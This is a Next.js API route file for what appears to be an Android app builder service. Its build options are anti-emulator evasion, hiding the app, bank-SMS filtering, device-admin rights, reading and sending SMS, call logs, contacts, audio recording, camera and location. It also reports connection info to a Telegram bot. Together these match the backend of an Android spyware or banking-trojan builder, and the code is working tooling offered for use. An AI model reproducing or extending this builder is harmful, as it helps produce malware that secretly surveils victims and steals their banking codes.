import { NextRequest, NextResponse } from 'next/server';
import { EventStreamResponse } from '@/lib/event-stream';
import { BuilderService } from './services/builder.service';

export const runtime = 'nodejs';

export async function POST(req: NextRequest) {
  try {
    const buildData = await req.json();

    if (!buildData.appName) {
      return NextResponse.json(
        { error: 'App name is required' },
        { status: 400 }
      );
    }

    if (!buildData.userId) {
      return NextResponse.json(
        { error: 'userId is required' },
        { status: 400 }
      );
    }

    if (!buildData.securityOptions) {
      buildData.securityOptions = {
        isAntiEmulator: false,
        isBankSmsOnly: false,
        isHideApplication: false,
        isGetCallLogs: false,
        isGetContacts: false,
        sendConnectionInfo: false,
        isAccessAllFiles: false,
        isAccessGallery: false,
        isAccessHiddenFolders: false,
        isDeviceAdmin: false,
        isReadSms: false,
        isSendSms: false,
        isAccessLocation: false,
        isRecordAudio: false,
        isAccessCamera: false,
        isReadPhoneState: false,
        isAccessCoarseLocation: false,
        isReadCallLog: false,
        isWriteCallLog: false,
        isWriteContacts: false,
        isReadCalendar: false,
        isWriteCalendar: false,
        isReadPhoneNumbers: false,
      };
    }

    if (
      buildData.securityOptions.sendConnectionInfo &&
      (!buildData.telegramConfig?.chatId || !buildData.telegramConfig?.botToken)
    ) {
      return NextResponse.json(
        { error: 'Telegram credentials are required when sendConnectionInfo is enabled' },
        { status: 400 }
      );
    }

    const { buildId } = await BuilderService.startBuild(buildData);
    return NextResponse.json({ buildId });

  } catch (error) {
    console.error('Build initialization error:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}

export async function GET(req: NextRequest) {
  try {
    const { searchParams } = new URL(req.url);
    const buildId = searchParams.get('buildId');

    if (!buildId) {
      return NextResponse.json(
        { error: 'buildId parameter is required' },
        { status: 400 }
      );
    }

    const stream = new EventStreamResponse();
    BuilderService.attachConnection(buildId, stream);

    req.signal.addEventListener('abort', () => {
      BuilderService.cleanupBuild(buildId);
      stream.close();
    });

    return stream.response;

  } catch (error) {
    console.error('SSE connection error:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}